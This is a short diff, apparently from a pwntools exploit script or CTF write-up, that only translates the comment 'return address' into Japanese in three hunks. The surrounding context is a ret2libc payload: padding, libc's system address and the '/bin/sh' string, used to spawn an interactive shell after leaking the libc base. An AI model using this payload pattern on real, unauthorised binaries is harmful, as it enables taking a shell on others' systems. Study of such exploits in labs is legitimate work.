@@ -72,7 +72,7 @@ log.success(f'LIBC base: {hex(libc.address)}')
 payload = flat(
     'A' * 32,
     libc.sym['system'],
-    0x0,        # return address
+    0x0,        # リターンアドレス
     next(libc.search(b'/bin/sh'))
 )
 
@@ -99,7 +99,7 @@ log.success(f'LIBC base: {hex(libc.address)}')
 payload = flat(
     'A' * 32,
     libc.sym['system'],
-    0x0,        # return address
+    0x0,        # リターンアドレス
     next(libc.search(b'/bin/sh'))
 )
 
@@ -122,7 +122,7 @@ p.interactive()
 payload = flat(
     'A' * 32,
     libc.sym['system'],
-    0x0,        # return address
+    0x0,        # リターンアドレス
     next(libc.search(b'/bin/sh'))
 )
 
